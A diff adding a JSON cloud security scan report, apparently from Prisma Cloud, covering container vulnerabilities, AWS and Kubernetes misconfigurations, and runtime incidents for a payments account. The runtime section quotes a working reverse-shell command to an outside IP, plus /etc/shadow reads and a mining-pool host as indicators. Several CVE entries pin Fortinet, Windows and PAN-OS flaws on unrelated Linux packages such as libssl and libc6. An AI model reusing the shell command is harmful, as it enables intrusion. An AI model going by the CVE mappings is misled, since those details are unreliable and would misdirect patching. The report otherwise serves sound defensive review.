@@ -1,0 +1,262 @@
+{
+  "report_id": "pc-rpt-2026031109-47a3f",
+  "scanner": "Prisma Cloud",
+  "scanner_version": "32.07.123",
+  "scan_type": "combined_cnapp_scan",
+  "generated_at": "2026-03-11T09:12:44Z",
+  "account": {
+    "cloud_provider": "AWS",
+    "account_id": "123456789012",
+    "account_alias": "prod-payment-env",
+    "region": "us-east-1"
+  },
+  "scope": {
+    "images_scanned": 14,
+    "registries": ["registry.internal.corp", "123456789012.dkr.ecr.us-east-1.amazonaws.com"],
+    "iac_files_scanned": 83,
+    "runtime_resources": 62
+  },
+  "summary": {
+    "critical": 7,
+    "high": 19,
+    "medium": 34,
+    "low": 18,
+    "informational": 9,
+    "compliance_checks_passed": 201,
+    "compliance_checks_failed": 47,
+    "iac_misconfigurations": 28,
+    "runtime_incidents": 3
+  },
+  "container_vulnerabilities": [
+    {
+      "id": "CVE-2024-3400",
+      "severity": "Critical",
+      "cvss": 10.0,
+      "package": "pan-os-base",
+      "package_version": "10.2.3",
+      "fix_version": "10.2.9-h1",
+      "image": "payment-service:2.14.1",
+      "layer": "sha256:a1b2c3d4e5f6",
+      "kev": true,
+      "epss": 0.9732,
+      "prisma_risk_factors": ["Attack Complexity: Low", "No Auth Required", "KEV Listed", "RCE", "Package in use"],
+      "prisma_recommended_fix": "Upgrade immediately. No workaround. Block network access to affected endpoint as temporary mitigation."
+    },
+    {
+      "id": "CVE-2024-21762",
+      "severity": "Critical",
+      "cvss": 9.8,
+      "package": "libssl1.1",
+      "package_version": "1.1.1n",
+      "fix_version": "1.1.1w",
+      "image": "api-gateway:1.8.0",
+      "layer": "sha256:b2c3d4e5f6a7",
+      "kev": true,
+      "epss": 0.9841,
+      "prisma_risk_factors": ["Attack Complexity: Low", "No Auth Required", "KEV Listed", "Remote Exploit"],
+      "prisma_recommended_fix": "Update libssl to 1.1.1w or later. Consider migration to OpenSSL 3.x."
+    },
+    {
+      "id": "CVE-2024-6387",
+      "severity": "Critical",
+      "cvss": 8.1,
+      "package": "openssh-server",
+      "package_version": "1:8.9p1-3ubuntu0.6",
+      "fix_version": "1:9.8p1",
+      "image": "bastion-host:3.1.2",
+      "layer": "sha256:c3d4e5f6a7b8",
+      "kev": false,
+      "epss": 0.6821,
+      "prisma_risk_factors": ["RCE as root", "Network accessible", "Race Condition"],
+      "prisma_recommended_fix": "Upgrade OpenSSH to 9.8p1 or set LoginGraceTime 0 as temporary mitigation."
+    },
+    {
+      "id": "CVE-2024-21626",
+      "severity": "Critical",
+      "cvss": 8.6,
+      "package": "runc",
+      "package_version": "1.1.9",
+      "fix_version": "1.1.12",
+      "image": "ALL images via container runtime",
+      "layer": "runtime",
+      "kev": false,
+      "epss": 0.6102,
+      "prisma_risk_factors": ["Container Escape", "Host Access", "Low Privilege Required"],
+      "prisma_recommended_fix": "Update runc to 1.1.12. Patch container runtime on all nodes. Affects entire Kubernetes cluster."
+    },
+    {
+      "id": "CVE-2023-44487",
+      "severity": "High",
+      "cvss": 7.5,
+      "package": "golang.org/x/net",
+      "package_version": "0.10.0",
+      "fix_version": "0.17.0",
+      "image": "grpc-service:5.2.1",
+      "layer": "sha256:d4e5f6a7b8c9",
+      "kev": true,
+      "epss": 0.7234,
+      "prisma_risk_factors": ["HTTP/2 DoS", "Widely Exploited", "KEV Listed"],
+      "prisma_recommended_fix": "Update golang.org/x/net. Implement HTTP/2 rate limiting as mitigation."
+    },
+    {
+      "id": "CVE-2024-38063",
+      "severity": "High",
+      "cvss": 8.1,
+      "package": "libc6",
+      "package_version": "2.31-13+deb11u6",
+      "fix_version": "2.31-13+deb11u10",
+      "image": "worker-node:debian-11-slim",
+      "layer": "sha256:e5f6a7b8c9d0",
+      "kev": true,
+      "epss": 0.7921,
+      "prisma_risk_factors": ["IPv6 Enabled", "Network Accessible", "Zero-click RCE"],
+      "prisma_recommended_fix": "Patch libc6. If immediate patch unavailable, disable IPv6 on affected interfaces."
+    }
+  ],
+  "iac_misconfigurations": [
+    {
+      "id": "PC-AWS-S3-001",
+      "severity": "Critical",
+      "title": "S3 bucket allows public read access",
+      "resource": "aws_s3_bucket.payment_receipts",
+      "file": "terraform/s3.tf",
+      "line": 34,
+      "description": "S3 bucket 'payment-receipts-prod' has ACL set to 'public-read'. Sensitive payment receipt documents are exposed to the internet.",
+      "remediation": "Set bucket ACL to 'private'. Enable Block Public Access settings. Use pre-signed URLs for authorized access."
+    },
+    {
+      "id": "PC-AWS-IAM-007",
+      "severity": "Critical",
+      "title": "IAM policy grants wildcard permissions (*) on all resources",
+      "resource": "aws_iam_policy.service_account_policy",
+      "file": "terraform/iam.tf",
+      "line": 17,
+      "description": "IAM policy attached to EKS service account uses 'Action: *' and 'Resource: *'. Violates principle of least privilege. Allows full AWS account access.",
+      "remediation": "Replace wildcard actions with specific permissions required by the service. Apply resource-level restrictions."
+    },
+    {
+      "id": "PC-AWS-RDS-003",
+      "severity": "Critical",
+      "title": "RDS instance is publicly accessible",
+      "resource": "aws_db_instance.payments_db",
+      "file": "terraform/rds.tf",
+      "line": 52,
+      "description": "RDS PostgreSQL instance has publicly_accessible = true. Database is exposed to internet traffic on port 5432.",
+      "remediation": "Set publicly_accessible = false. Place RDS in private subnet. Use security groups to restrict access to application servers only."
+    },
+    {
+      "id": "PC-AWS-EC2-012",
+      "severity": "High",
+      "title": "Security group allows unrestricted inbound SSH (0.0.0.0/0 on port 22)",
+      "resource": "aws_security_group.bastion_sg",
+      "file": "terraform/networking.tf",
+      "line": 89,
+      "description": "Security group 'bastion-sg' allows SSH from 0.0.0.0/0 and ::/0. SSH brute force and exploitation risk.",
+      "remediation": "Restrict SSH to known corporate IP ranges. Use AWS Systems Manager Session Manager as SSH alternative."
+    },
+    {
+      "id": "PC-AWS-EKS-005",
+      "severity": "High",
+      "title": "EKS cluster has public API server endpoint enabled",
+      "resource": "aws_eks_cluster.prod_cluster",
+      "file": "terraform/eks.tf",
+      "line": 23,
+      "description": "EKS cluster API endpoint is accessible from the public internet. Kubernetes API exposed without network restriction.",
+      "remediation": "Set endpoint_public_access = false or restrict access via endpoint_public_access_cidrs to trusted IP ranges only."
+    },
+    {
+      "id": "PC-AWS-KMS-002",
+      "severity": "High",
+      "title": "EBS volumes not encrypted with customer-managed KMS key",
+      "resource": "aws_instance.app_server",
+      "file": "terraform/ec2.tf",
+      "line": 41,
+      "description": "5 EBS volumes attached to production EC2 instances are using AWS-managed keys instead of customer-managed KMS keys. Limits key rotation control.",
+      "remediation": "Create customer-managed KMS keys. Encrypt EBS volumes using aws:kms with CMK. Enable automatic key rotation."
+    },
+    {
+      "id": "PC-K8S-POD-009",
+      "severity": "High",
+      "title": "Container running as root (UID 0)",
+      "resource": "deployment/payment-service",
+      "file": "k8s/payment-service-deployment.yaml",
+      "line": 67,
+      "description": "Container 'payment-api' does not set securityContext.runAsNonRoot. Process runs as UID 0 (root). Container escape would yield root on host.",
+      "remediation": "Add securityContext: runAsNonRoot: true, runAsUser: 1000 to container spec. Rebuild image to run as non-root user."
+    },
+    {
+      "id": "PC-K8S-POD-014",
+      "severity": "High",
+      "title": "Privileged container detected",
+      "resource": "deployment/monitoring-agent",
+      "file": "k8s/monitoring-deployment.yaml",
+      "line": 44,
+      "description": "Container 'fluentd-log-agent' has securityContext.privileged: true. Privileged containers can access host namespaces and devices.",
+      "remediation": "Remove privileged: true. Grant only required Linux capabilities. Use specific capabilities (CAP_NET_ADMIN) instead of full privilege."
+    },
+    {
+      "id": "PC-K8S-NET-003",
+      "severity": "Medium",
+      "title": "Kubernetes namespace missing NetworkPolicy",
+      "resource": "namespace/production",
+      "file": "k8s/namespaces.yaml",
+      "line": 1,
+      "description": "Namespace 'production' has no NetworkPolicy defined. All pods can communicate freely. Lateral movement unconstrained.",
+      "remediation": "Implement default-deny NetworkPolicy for ingress and egress. Whitelist required pod-to-pod communication explicitly."
+    },
+    {
+      "id": "PC-K8S-RBAC-006",
+      "severity": "High",
+      "title": "ClusterRoleBinding grants cluster-admin to service account",
+      "resource": "clusterrolebinding/payment-service-admin",
+      "file": "k8s/rbac.yaml",
+      "line": 12,
+      "description": "ServiceAccount 'payment-service-sa' in namespace 'production' is bound to 'cluster-admin' ClusterRole. Full cluster access granted.",
+      "remediation": "Replace cluster-admin binding with namespace-scoped Role with minimal required permissions."
+    }
+  ],
+  "runtime_incidents": [
+    {
+      "id": "RT-INC-2026031107",
+      "severity": "Critical",
+      "type": "Cryptominer Detected",
+      "container": "worker-node-7 / job-processor:1.4.2",
+      "detected_at": "2026-03-11T07:18:33Z",
+      "description": "Process 'xmrig' detected running in container. Network connections to known mining pool pool.hashvault.pro:443 observed. CPU utilization spiked to 98%.",
+      "ioc": ["xmrig", "pool.hashvault.pro", "CPU > 95% sustained"],
+      "response": "Container killed. Image quarantined. Node cordoned."
+    },
+    {
+      "id": "RT-INC-2026031106",
+      "severity": "High",
+      "type": "Reverse Shell Attempt",
+      "container": "api-gateway:1.8.0",
+      "detected_at": "2026-03-11T06:44:12Z",
+      "description": "bash -i >& /dev/tcp/185.220.101.44/4444 0>&1 detected in container process tree. Outbound connection to known Tor exit node blocked by egress policy.",
+      "ioc": ["bash -i >&", "185.220.101.44", "port 4444"],
+      "response": "Process blocked by runtime policy. Alert triggered. Container flagged for forensic analysis."
+    },
+    {
+      "id": "RT-INC-2026031105",
+      "severity": "High",
+      "type": "Sensitive File Access",
+      "container": "payment-service:2.14.1",
+      "detected_at": "2026-03-11T05:31:59Z",
+      "description": "Process 'python3' accessed /etc/shadow and /proc/1/environ outside normal baseline. Possible credential harvesting behavior.",
+      "ioc": ["/etc/shadow read", "/proc/1/environ read", "anomalous process ancestry"],
+      "response": "Alert raised. Process baseline deviation logged. SOC investigation triggered."
+    }
+  ],
+  "compliance": {
+    "frameworks": ["CIS AWS Foundations Benchmark v1.5", "PCI DSS 4.0", "SOC 2 Type II", "NIST 800-53"],
+    "passed": 201,
+    "failed": 47,
+    "top_failures": [
+      "CIS 2.1.1 — Ensure S3 Bucket Block Public Access is enabled",
+      "PCI DSS 6.3.3 — All system components are protected from known vulnerabilities",
+      "NIST AC-6 — Principle of Least Privilege not enforced (IAM wildcard policies)",
+      "CIS 4.1 — Ensure no security groups allow unrestricted inbound access to port 22",
+      "PCI DSS 8.6 — System/application accounts are managed via policies and procedures"
+    ]
+  }
+}
